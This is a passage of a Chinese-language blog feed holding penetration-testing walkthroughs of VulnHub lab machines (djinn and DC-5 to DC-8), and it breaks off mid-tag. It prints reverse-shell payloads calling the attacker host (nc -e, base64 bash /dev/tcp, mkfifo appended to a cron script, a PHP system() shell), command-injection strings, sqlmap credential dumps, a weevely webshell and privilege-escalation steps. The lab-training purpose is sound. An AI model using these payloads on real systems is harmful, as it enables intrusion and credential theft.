        <content type="html"><![CDATA[<h1 id="综合实战第三章"><a href="#综合实战第三章" class="headerlink" title="综合实战第三章"></a>综合实战第三章</h1><h2 id="异常端口实战"><a href="#异常端口实战" class="headerlink" title="异常端口实战"></a>异常端口实战</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><blockquote><p>靶场下载：<a href="https://www.vulnhub.com/entry/djinn-1,397/">https://www.vulnhub.com/entry/djinn-1,397/</a></p><p>攻击机:</p><p>kali 192.168.3.134</p><p>win7 192.168.3.137</p><p>靶机:djinn 192.168.3.171</p></blockquote><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>先扫描端口</p><pre class=" language-Linux"><code class="language-Linux">nmap -p- -A 192.168.3.171</code></pre><p><img src="/2022/05/02/djinn/image-20220502203117441.png" alt="image-20220502203117441"></p><p>有FTP服务，可以先看看</p><pre class=" language-Linux"><code class="language-Linux">ftp 192.168.3.171anonymous</code></pre><p>里面有三个文件</p><p><img src="/2022/05/02/djinn/image-20220502203424210.png" alt="image-20220502203424210"></p><p>把他们都下载下来</p><pre class=" language-Linux"><code class="language-Linux">get creds.txtget game.txtget message.txt</code></pre><p>把这三个文件都看看有啥东西</p><p>也没啥玩意，先看看7331端口吧</p><p><img src="/2022/05/02/djinn/image-20220503082440871.png" alt="image-20220503082440871"></p><p>先扫描一下</p><pre class=" language-Linux"><code class="language-Linux">gobuster dir -u http://192.168.3.171:7331 -w /usr/share/wordlists/dirb/big.txt</code></pre><p><img src="/2022/05/02/djinn/image-20220503084244876.png" alt="image-20220503084244876"></p><p>扫出来这俩玩意，去看看</p><p>在<code>/wish</code>里看到这个</p><p><img src="/2022/05/02/djinn/image-20220503084428233.png" alt="image-20220503084428233"></p><p>输入id，发现确实会输出，说明有命令执行漏洞</p><p><img src="/2022/05/02/djinn/image-20220503085541127.png" alt="image-20220503085541127"></p><p>那么久可以构造nc</p><pre class=" language-Linux"><code class="language-Linux">nc -e /bin/sh 192.168.3.134 1234</code></pre><p><img src="/2022/05/02/djinn/image-20220503085737059.png" alt="image-20220503085737059"></p><p>说明可能会屏蔽某些字符</p><p>那么用<code>base64</code>加密</p><pre class=" language-Linux"><code class="language-Linux">echo 'bash -i >& /dev/tcp/192.168.3.134/1234 0>&1' | base64</code></pre><p><img src="/2022/05/02/djinn/image-20220503090432300.png" alt="image-20220503090432300"></p><p>然后在命令行中输入</p><pre class=" language-Linux"><code class="language-Linux">echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuMTM0LzEyMzQgMD4mMQo= | base64 -d | bash</code></pre><p>nc成功连接</p><p><img src="/2022/05/02/djinn/image-20220503090459398.png" alt="image-20220503090459398"></p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>查看一下<code>/etc/passwd</code></p><p><img src="/2022/05/02/djinn/image-20220503090707001.png" alt="image-20220503090707001"></p><p>去看看<code>/home</code></p><p>在<code>nitish</code>里找到一个<code>user.txt</code></p><p>但是没有权限</p><p><img src="/2022/05/02/djinn/image-20220503091156334.png" alt="image-20220503091156334"></p><p>查看一下文件权限</p><pre class=" language-Linux"><code class="language-Linux">ls -la</code></pre><p><img src="/2022/05/02/djinn/image-20220503091221457.png" alt="image-20220503091221457"></p><p>进入<code>.dev</code>目录</p><p>看到creds.txt，里面有账号和密码</p><p><img src="/2022/05/02/djinn/image-20220503091530713.png" alt="image-20220503091530713"></p><p>可以提权</p><p>先打开一个terminal</p><pre class=" language-Linux"><code class="language-Linux">python -c 'import pty;pty.spawn("/bin/bash")'</code></pre><p>然后进入nitish用户</p><pre class=" language-Linux"><code class="language-Linux">su nitish</code></pre><p><img src="/2022/05/02/djinn/image-20220503091833091.png" alt="image-20220503091833091"></p><p>可以去看看user.txt里面有啥玩意了</p><pre class=" language-Linux"><code class="language-Linux">cat user.txt10aay8289ptgguy1pvfa73alzusyyx3c</code></pre><p><img src="/2022/05/02/djinn/image-20220503091921697.png" alt="image-20220503091921697"></p><p>不知道这个是干啥用的，先存起来</p><p>查看别的权限</p><pre class=" language-Linux"><code class="language-Linux">sudo -l</code></pre><p><img src="/2022/05/02/djinn/image-20220503092033691.png" alt="image-20220503092033691"></p><p>看看genie里有啥</p><pre class=" language-Linux"><code class="language-Linux">genie -h</code></pre><p>可以提权到sam这个用户</p><pre class=" language-Linux"><code class="language-Linux">sudo -u sam genie -cmd whoami</code></pre><p><img src="/2022/05/02/djinn/image-20220503092301951.png" alt="image-20220503092301951"></p><p>再看一眼别的权限</p><pre class=" language-Linux"><code class="language-Linux">sudo -l</code></pre><p><img src="/2022/05/02/djinn/image-20220503092344577.png" alt="image-20220503092344577"></p><p>看到有个用root权限的</p><p>在sam文件夹下面有<code>.py</code>文件</p><p>把他传送到本地进行反编译</p><pre class=" language-Linux"><code class="language-Linux">python -m SimpleHTTPServer</code></pre><p>在本机</p><pre class=" language-Linux"><code class="language-Linux">wget http://192.168.3.171:8000/.pyc</code></pre><p>进行反编译</p><pre class=" language-Linux"><code class="language-Linux">uncompyle6 -o app.py app.pyc</code></pre><p>编译完之后查看一下</p><p><img src="/2022/05/02/djinn/image-20220503100633448.png" alt="image-20220503100633448"></p><p>根据代码审计</p><p>使用命令</p><pre class=" language-Linux"><code class="language-Linux">sudo -u root /root/lago2num</code></pre><p><img src="/2022/05/02/djinn/image-20220503101232396.png" alt="image-20220503101232396"></p><p>提权到root，结束！</p><p><img src="/2022/05/02/djinn/image-20220503101340126.png" alt="image-20220503101340126"></p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 靶场练习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 综合实战 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> 靶场练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>综合实战第二章-DC-8</title>
      <link href="/2022/05/02/DC-8/"/>
      <url>/2022/05/02/DC-8/</url>
      
        <content type="html"><![CDATA[<h1 id="综合实战第二章"><a href="#综合实战第二章" class="headerlink" title="综合实战第二章"></a>综合实战第二章</h1><h2 id="DC-8"><a href="#DC-8" class="headerlink" title="DC-8"></a>DC-8</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><blockquote><p>靶场下载：<a href="https://www.vulnhub.com/?page=2&amp;q=dc">https://www.vulnhub.com/?page=2&amp;q=dc</a></p><p>攻击机:</p><p>kali 192.168.3.134</p><p>win7 192.168.3.137</p><p>靶机:DC-8 192.168.3.170</p></blockquote><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><pre class=" language-Linux"><code class="language-Linux">nmap -p- -A 192.168.3.170</code></pre><p><img src="/2022/05/02/DC-8/image-20220502190850315.png" alt="image-20220502190850315"></p><p>先看看80端口</p><p><img src="/2022/05/02/DC-8/image-20220502191019229.png" alt="image-20220502191019229"></p><p>用whatweb查看一下</p><pre class=" language-Linux"><code class="language-Linux">whatweb http://192.168.3.170</code></pre><p><img src="/2022/05/02/DC-8/image-20220502191729060.png" alt="image-20220502191729060"></p><p>看不出啥，继续在网页里找吧</p><p><img src="/2022/05/02/DC-8/image-20220502191901919.png" alt="image-20220502191901919"></p><p>可能存在sql注入</p><p>用sqlmap跑一下，出现库名</p><pre class=" language-Linux"><code class="language-Linux">sqlmap -u "http://192.168.3.170/?nid=1" --dbs</code></pre><p><img src="/2022/05/02/DC-8/image-20220502192047444.png" alt="image-20220502192047444"></p><p>表名</p><pre class=" language-Linux"><code class="language-Linux">sqlmap -u "http://192.168.3.170/?nid=1" -D d7db --tables</code></pre><p><img src="/2022/05/02/DC-8/image-20220502192152641.png" alt="image-20220502192152641"></p><p>列名</p><pre class=" language-Linux"><code class="language-Linux">sqlmap -u "http://192.168.3.170/?nid=1" -D d7db -T users --columns</code></pre><p><img src="/2022/05/02/DC-8/image-20220502192256668.png" alt="image-20220502192256668"></p><p>字段名</p><pre class=" language-Linux"><code class="language-Linux">sqlmap -u "http://192.168.3.170/?nid=1" -D d7db -T users -C name,pass --dump</code></pre><p><img src="/2022/05/02/DC-8/image-20220502192419929.png" alt="image-20220502192419929"></p><p>把账号和密码用<code>:</code>相连</p><p><img src="/2022/05/02/DC-8/image-20220502192630660.png" alt="image-20220502192630660"></p><p>破解用户名密码</p><pre class=" language-Linux"><code class="language-Linux">john userpass</code></pre><p><img src="/2022/05/02/DC-8/image-20220502193056991.png" alt="image-20220502193056991"></p><p>出来john的了</p><p>可以登录了，访问</p><pre class=" language-Linux"><code class="language-Linux">http://192.168.3.170/user/login</code></pre><p><img src="/2022/05/02/DC-8/image-20220502193202261.png" alt="image-20220502193202261"></p><p>确实登录成功</p><h3 id="上传木马"><a href="#上传木马" class="headerlink" title="上传木马"></a>上传木马</h3><p>既然已经进入了，就随便找找</p><p><img src="/2022/05/02/DC-8/image-20220502193709574.png" alt="image-20220502193709574"></p><p>在webform这里发现可以上传php</p><p><img src="/2022/05/02/DC-8/image-20220502193736424.png" alt="image-20220502193736424"></p><p>构造语句</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"nc -e /bin/sh 192.168.3.134 1234"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><img src="/2022/05/02/DC-8/image-20220502194111863.png" alt="image-20220502194111863"></p><p>然后nc连接</p><pre class=" language-Linux"><code class="language-Linux">nc -lvvp 1234</code></pre><p>在view里执行</p><p><img src="/2022/05/02/DC-8/image-20220502194211624.png" alt="image-20220502194211624"></p><p>连接成功</p><p><img src="/2022/05/02/DC-8/image-20220502194244761.png" alt="image-20220502194244761"></p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>老规矩，先美化</p><pre class=" language-Linux"><code class="language-Linux">python -c 'import pty;pty.spawn("/bin/bash")'</code></pre><p>看一下哪些东西是root权限</p><pre class=" language-Linux"><code class="language-Linux">find / -perm -u=s -type f 2>/dev/null</code></pre><p><img src="/2022/05/02/DC-8/image-20220502194557668.png" alt="image-20220502194557668"></p><p>有个<code>exim4</code></p><p>查看exim4的版本</p><pre class=" language-Linux"><code class="language-Linux">/usr/sbin/exim4 --version</code></pre><p><img src="/2022/05/02/DC-8/image-20220502194747186.png" alt="image-20220502194747186"></p><p>根据版本查找漏洞</p><pre class=" language-Linux"><code class="language-Linux">searchsploit exim</code></pre><p><img src="/2022/05/02/DC-8/image-20220502195007793.png" alt="image-20220502195007793"></p><p>我们用46996</p><p>先拷贝到本地</p><pre class=" language-Linux"><code class="language-Linux">cp /usr/share/exploitdb/exploits/linux/local/46996.sh 46996.sh</code></pre><p>然后打开httpserver</p><pre class=" language-Linux"><code class="language-Linux">python -m SimpleHTTPServer</code></pre><p>然后在nc里面下载</p><pre class=" language-Linux"><code class="language-Linux">wget http://192.168.3.134:8000/46996.sh</code></pre><p><img src="/2022/05/02/DC-8/image-20220502195449340.png" alt="image-20220502195449340"></p><p>加权限</p><pre class=" language-Linux"><code class="language-Linux">chmod 777 46996.sh</code></pre><p>运行</p><pre class=" language-Linux"><code class="language-Linux">./46996.sh -m netcat</code></pre><p>是root权限了</p><p><img src="/2022/05/02/DC-8/image-20220502195923899.png" alt="image-20220502195923899"></p><p>拿到flag</p><p><img src="/2022/05/02/DC-8/image-20220502195846888.png" alt="image-20220502195846888"></p><p>结束！！</p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 靶场练习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 综合实战 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> 靶场练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>综合实战第二章-DC-7</title>
      <link href="/2022/05/02/DC-7/"/>
      <url>/2022/05/02/DC-7/</url>
      
        <content type="html"><![CDATA[<h1 id="综合实战第二章"><a href="#综合实战第二章" class="headerlink" title="综合实战第二章"></a>综合实战第二章</h1><h2 id="DC-7"><a href="#DC-7" class="headerlink" title="DC-7"></a>DC-7</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><blockquote><p>靶场下载：<a href="https://www.vulnhub.com/?page=2&amp;q=dc">https://www.vulnhub.com/?page=2&amp;q=dc</a></p><p>攻击机:</p><p>kali 192.168.3.134</p><p>win7 192.168.3.137</p><p>靶机:DC-5 192.168.3.169</p></blockquote><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><pre class=" language-Linux"><code class="language-Linux">nmap -p- -A 192.168.3.169</code></pre><p><img src="/2022/05/02/DC-7/image-20220502163625665.png" alt="image-20220502163625665"></p><p>开放了22、80端口，先打开网页看看</p><p><img src="/2022/05/02/DC-7/image-20220502163735836.png" alt="image-20220502163735836"></p><p>搜集一些信息</p><pre class=" language-Linux"><code class="language-Linux">whatweb http://192.168.3.169</code></pre><p><img src="/2022/05/02/DC-7/image-20220502163858921.png" alt="image-20220502163858921"></p><p>也没啥东西</p><p>他说要在外面查找</p><p><img src="/2022/05/02/DC-7/image-20220502164407282.png" alt="image-20220502164407282"></p><p>看到这玩意，百度一下</p><p>在github中找到一个DC7USER中找到源文件</p><p><img src="/2022/05/02/DC-7/image-20220502164604249.png" alt="image-20220502164604249"></p><p>在config.php中找到账号密码</p><p><img src="/2022/05/02/DC-7/image-20220502164624375.png" alt="image-20220502164624375"></p><p>尝试登录</p><p>用sql没成功，ssh成功了</p><pre class=" language-Linux"><code class="language-Linux">ssh dc7user@192.168.3.169</code></pre><p><img src="/2022/05/02/DC-7/image-20220502164931980.png" alt="image-20220502164931980"></p><h3 id="登录网站"><a href="#登录网站" class="headerlink" title="登录网站"></a>登录网站</h3><p>尝试登录网站</p><p>先看看有啥</p><pre class=" language-Linux"><code class="language-Linux">ls</code></pre><p><img src="/2022/05/02/DC-7/image-20220502165118342.png" alt="image-20220502165118342"></p><p>在backups目录里有俩东西</p><p><img src="/2022/05/02/DC-7/image-20220502165138303.png" alt="image-20220502165138303"></p><p>再看看mbox</p><p><img src="/2022/05/02/DC-7/image-20220502165241108.png" alt="image-20220502165241108"></p><p>发现他是运行了<code>backups.sh</code></p><p>看一下<code>backups.sh</code>文件里写的啥</p><pre class=" language-Linux"><code class="language-Linux">cd /opt/scriptscat backups.sh</code></pre><p><img src="/2022/05/02/DC-7/image-20220502165454783.png" alt="image-20220502165454783"></p><p>应该是用来备份数据库的一个东西</p><p>我们根据提示再去网站目录看看</p><pre class=" language-Linux"><code class="language-Linux">cd /var/www/html</code></pre><p>通过drush命令修改密码</p><pre class=" language-Linux"><code class="language-Linux">drush user-password admin --password="123456"</code></pre><p>可以登录网站了</p><h3 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h3><p>先点击这个</p><p><img src="/2022/05/02/DC-7/image-20220502170316618.png" alt="image-20220502170316618"></p><p><img src="/2022/05/02/DC-7/image-20220502170326098.png" alt="image-20220502170326098"></p><p>这里发现上传点，但是不让上传php的文件</p><p><img src="/2022/05/02/DC-7/image-20220502170350998.png" alt="image-20220502170350998"></p><p>所以要安装插件</p><p>插件下载:<a href="http://drupal.org/project/php">http://drupal.org/project/php</a></p><p>下载好之后不用解压，直接安装</p><p><img src="/2022/05/02/DC-7/image-20220502170647706.png" alt="image-20220502170647706"></p><p>进去之后点击</p><p><img src="/2022/05/02/DC-7/image-20220502170708236.png" alt="image-20220502170708236"></p><p>找好目录上传就好</p><p><img src="/2022/05/02/DC-7/image-20220502170740687.png" alt="image-20220502170740687"></p><p>上传成功</p><p><img src="/2022/05/02/DC-7/image-20220502170752845.png" alt="image-20220502170752845"></p><p>然后激活</p><p>在Extend-List中找到PHP Filter</p><p><img src="/2022/05/02/DC-7/image-20220502171120044.png" alt="image-20220502171120044"></p><p>点击<code>install</code></p><p><img src="/2022/05/02/DC-7/image-20220502171136956.png" alt="image-20220502171136956"></p><p>现在就能上传php了</p><p><img src="/2022/05/02/DC-7/image-20220502171228605.png" alt="image-20220502171228605"></p><h3 id="写入木马"><a href="#写入木马" class="headerlink" title="写入木马"></a>写入木马</h3><p>首先构造一个</p><pre class=" language-Linux"><code class="language-Linux">weevely generate 123456 dcmuma.php      </code></pre><p>构造好之后把内容复制进去</p><p><img src="/2022/05/02/DC-7/image-20220502171447524.png" alt="image-20220502171447524"></p><p>然后保存</p><p><img src="/2022/05/02/DC-7/image-20220502171503191.png" alt="image-20220502171503191"></p><p>保存成功后使用weevely</p><pre class=" language-Linux"><code class="language-Linux">weevely http://192.168.3.169/node/4 123456</code></pre><p><img src="/2022/05/02/DC-7/image-20220502171600683.png" alt="image-20220502171600683"></p><p>连接成功</p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>首先反弹nc</p><pre class=" language-Linux"><code class="language-Linux">nc -e /bin/bash 192.168.3.134 4444</code></pre><p>然后在kali上另开一个窗口</p><pre class=" language-Linux"><code class="language-Linux">nc -lvvp 4444</code></pre><p>美化一下界面</p><pre class=" language-Linux"><code class="language-Linux">python -c 'import pty;pty.spawn("/bin/bash")'</code></pre><p>去搞backups.sh</p><pre class=" language-Linux"><code class="language-Linux">cd /opt/scriptsls -la</code></pre><p><img src="/2022/05/02/DC-7/image-20220502172807289.png" alt="image-20220502172807289"></p><p>我们要再backups.sh里面加点东西</p><pre class=" language-Linux"><code class="language-Linux">echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.3.134 1234 > /tmp/f" >> backups.sh</code></pre><p>设置监听</p><pre class=" language-Linux"><code class="language-Linux">nc -lvvp 1234</code></pre><p>等待计划任务运行</p><p><img src="/2022/05/02/DC-7/image-20220502184535490.png" alt="image-20220502184535490"></p><p>连接成功</p><p><img src="/2022/05/02/DC-7/image-20220502184607015.png" alt="image-20220502184607015"></p><p>拿到flag！</p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 靶场练习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 综合实战 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> 靶场练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>综合实战第二章-DC-6</title>
      <link href="/2022/05/02/DC-6/"/>
      <url>/2022/05/02/DC-6/</url>
      
        <content type="html"><![CDATA[<h1 id="综合实战第二章"><a href="#综合实战第二章" class="headerlink" title="综合实战第二章"></a>综合实战第二章</h1><h2 id="DC-6"><a href="#DC-6" class="headerlink" title="DC-6"></a>DC-6</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><blockquote><p>靶场下载：<a href="https://www.vulnhub.com/?page=2&amp;q=dc">https://www.vulnhub.com/?page=2&amp;q=dc</a></p><p>攻击机:</p><p>kali 192.168.3.134</p><p>win7 192.168.3.137</p><p>靶机:DC-6 192.168.3.168</p></blockquote><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>日常信息搜集</p><pre class=" language-Linux"><code class="language-Linux">nmap -p- -A 192.168.3.168</code></pre><p><img src="/2022/05/02/DC-6/image-20220502143254525.png" alt="image-20220502143254525"></p><p>把<code>/etc/hosts</code>里面加入域名</p><pre class=" language-Linux"><code class="language-Linux">192.168.3.168 wordy</code></pre><p><img src="/2022/05/02/DC-6/image-20220502144051281.png" alt="image-20220502144051281"></p><p>查看网页，是用<code>wordpress</code>这个cms做的</p><p>使用dirb扫描一下</p><pre class=" language-Linux"><code class="language-Linux">dirb http://192.168.3.168</code></pre><p><img src="/2022/05/02/DC-6/image-20220502145804944.png" alt="image-20220502145804944"></p><p>看到登录的网址</p><p>使用wpscan扫描一下用户</p><pre class=" language-Linux"><code class="language-Linux">wpscan --url http://wordy/ -e u</code></pre><p><img src="/2022/05/02/DC-6/image-20220502144342683.png" alt="image-20220502144342683"></p><p>把这些账号名存起来</p><p>密码使用<code>rockyou.txt</code></p><pre class=" language-Linux"><code class="language-Linux">cp /usr/share/wordlists/rockyou.txt.gz rockyou.txt.gz   gzip -d rockyou.txt.gzcat /usr/share/wordlists/rockyou.txt | grep k01 > dc6passwd.txt</code></pre><p>有账号有密码了，可以进行爆破了</p><pre class=" language-Linux"><code class="language-Linux">wpscan --url wordy/ -U user -P dc6passwd.txt -t 50 </code></pre><p><img src="/2022/05/02/DC-6/image-20220502153319459.png" alt="image-20220502153319459"></p><p>进行登录，看到安装<code>activity_monitor</code>插件</p><p><img src="/2022/05/02/DC-6/image-20220502153857543.png" alt="image-20220502153857543"></p><p>查找一下漏洞</p><pre class=" language-Linux"><code class="language-Linux">searchsploit activity monitor</code></pre><p><img src="/2022/05/02/DC-6/image-20220502154050371.png" alt="image-20220502154050371"></p><p>可以用这个漏洞尝试</p><p>查看这个html,里面有个CVE-2018-15877</p><p>打开burpsuite，抓包</p><pre class=" language-Linux"><code class="language-Linux">burpsuite</code></pre><p><img src="/2022/05/02/DC-6/image-20220502155035393.png" alt="image-20220502155035393"></p><p>发现有命令执行漏洞</p><p><img src="/2022/05/02/DC-6/image-20220502155341310.png" alt="image-20220502155341310"></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用nc，burpsuite里修改参数</p><pre class=" language-Linux"><code class="language-Linux">127.0.0.1|nc -e /bin/bash 192.168.3.134 4444</code></pre><p>然后在kali上搞一下</p><pre class=" language-Linux"><code class="language-Linux">nc -lvvp 4444</code></pre><p><img src="/2022/05/02/DC-6/image-20220502155637529.png" alt="image-20220502155637529"></p><p>成功返回shell</p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>先美化一下</p><pre class=" language-Linux"><code class="language-Linux">python -c 'import pty;pty.spawn("/bin/bash")'</code></pre><p>进入&#x2F;home目录，挨个找找有啥好东西，发现在<code>mark/stuff</code>的目录里有个文件，查看</p><pre class=" language-Linux"><code class="language-Linux">cat things-to-do.txt</code></pre><p><img src="/2022/05/02/DC-6/image-20220502160304918.png" alt="image-20220502160304918"></p><p>登录<code>graham</code>用户</p><pre class=" language-Linux"><code class="language-Linux">su graham</code></pre><p><img src="/2022/05/02/DC-6/image-20220502160446648.png" alt="image-20220502160446648"></p><p>查看权限</p><pre class=" language-Linux"><code class="language-Linux">sudo -l</code></pre><p><img src="/2022/05/02/DC-6/image-20220502160526129.png" alt="image-20220502160526129"></p><p>去看看这玩意是啥</p><p><img src="/2022/05/02/DC-6/image-20220502160833895.png" alt="image-20220502160833895"></p><p>发现这是个备份脚本，在里面写入</p><pre class=" language-Linux"><code class="language-Linux">echo "/bin/bash" >>backups.sh</code></pre><p>可以通过ssh登录</p><pre class=" language-Linux"><code class="language-Linux">ssh graham@192.168.3.168</code></pre><p><img src="/2022/05/02/DC-6/image-20220502161612787.png" alt="image-20220502161612787"></p><p>然后进去<code>/home/jens</code>目录</p><p>执行</p><pre class=" language-Linux"><code class="language-Linux">sudo -u jens ./backups.sh</code></pre><p><img src="/2022/05/02/DC-6/image-20220502161948654.png" alt="image-20220502161948654"></p><p>再次查看权限</p><pre class=" language-Linux"><code class="language-Linux">sudo -l</code></pre><p><img src="/2022/05/02/DC-6/image-20220502162038111.png" alt="image-20220502162038111"></p><p>使用<code>nmap</code>提权</p><pre class=" language-Linux"><code class="language-Linux">echo 'os.execute("/bin/sh")' > testsudo nmap --script=test</code></pre><p><img src="/2022/05/02/DC-6/image-20220502162342775.png" alt="image-20220502162342775"></p><p>提权到root</p><p>在&#x2F;root目录里找到flag</p><p><img src="/2022/05/02/DC-6/image-20220502162417678.png" alt="image-20220502162417678"></p><p>完事！</p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 靶场练习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 综合实战 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> 靶场练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>综合实战第二章-DC-5</title>
      <link href="/2022/05/01/DC-5/"/>
      <url>/2022/05/01/DC-5/</url>
      
        <content type="html"><![CDATA[<h1 id="综合实战第二章"><a href="#综合实战第二章" class="headerlink" title="综合实战第二章"></a>综合实战第二章</h1><h2 id="DC-5"><a href="#DC-5" class="headerlink" title="DC-5"></a>DC-5</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><blockquote><p>靶场下载：<a href="https://www.vulnhub.com/?page=2&amp;q=dc">https://www.vulnhub.com/?page=2&amp;q=dc</a></p><p>攻击机:</p><p>kali 192.168.3.134</p><p>win7 192.168.3.137</p><p>靶机:DC-5 192.168.3.166</p></blockquote><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>枯燥乏味的信息搜集</p><pre class=" language-Linux"><code class="language-Linux">nmap -p- -A 192.168.3.166</code></pre><p><img src="/2022/05/01/DC-5/image-20220501110232344.png" alt="image-20220501110232344"></p><p>访问80端口看看有什么有用的信息</p><p><img src="/2022/05/01/DC-5/image-20220501111034039.png" alt="image-20220501111034039"></p><p>在这里可以提交表单看一下</p><p><img src="/2022/05/01/DC-5/image-20220501111106416.png" alt="image-20220501111106416"></p><p>发现这玩意会随着刷新而变化</p><p><img src="/2022/05/01/DC-5/image-20220501111131243.png" alt="image-20220501111131243"></p><p>抓包看看</p><p><img src="/2022/05/01/DC-5/image-20220501150840499.png" alt="image-20220501150840499"></p><p>穷举一下看看有哪些文件名</p><p>把他扔到intrude里</p><p>payload选择filenames-short和filenames-long</p><p><img src="/2022/05/01/DC-5/image-20220502103240049.png" alt="image-20220502103240049"></p><p>开始穷举</p><p>扫到这些玩意</p><p><img src="/2022/05/01/DC-5/image-20220502103457179.png" alt="image-20220502103457179"></p><p>发现footer页面</p><p><img src="/2022/05/01/DC-5/image-20220502103641356.png" alt="image-20220502103641356"></p><p>每次刷新他都会变，说明之前的页面可能调用了footer</p><p>继续抓包，对参数进行穷举</p><p><img src="/2022/05/01/DC-5/image-20220502103937407.png" alt="image-20220502103937407"></p><p>设置两个参数</p><p><img src="/2022/05/01/DC-5/image-20220502104050301.png" alt="image-20220502104050301"></p><p>模式选择这个</p><p><img src="/2022/05/01/DC-5/image-20220502104125682.png" alt="image-20220502104125682"></p><p>第一个攻击载荷选择filename-short和filename-long</p><p><img src="/2022/05/01/DC-5/image-20220502104307938.png" alt="image-20220502104307938"></p><p>第二个攻击载荷选择fuzzing-full</p><p><img src="/2022/05/01/DC-5/image-20220502104351774.png" alt="image-20220502104351774"></p><p>穷举出来前面的名字是<code>file</code></p><p><img src="/2022/05/01/DC-5/image-20220502104435202.png" alt="image-20220502104435202"></p><p>再次进行抓包，这次对file后面的信息进行破解</p><p><img src="/2022/05/01/DC-5/image-20220502104604033.png" 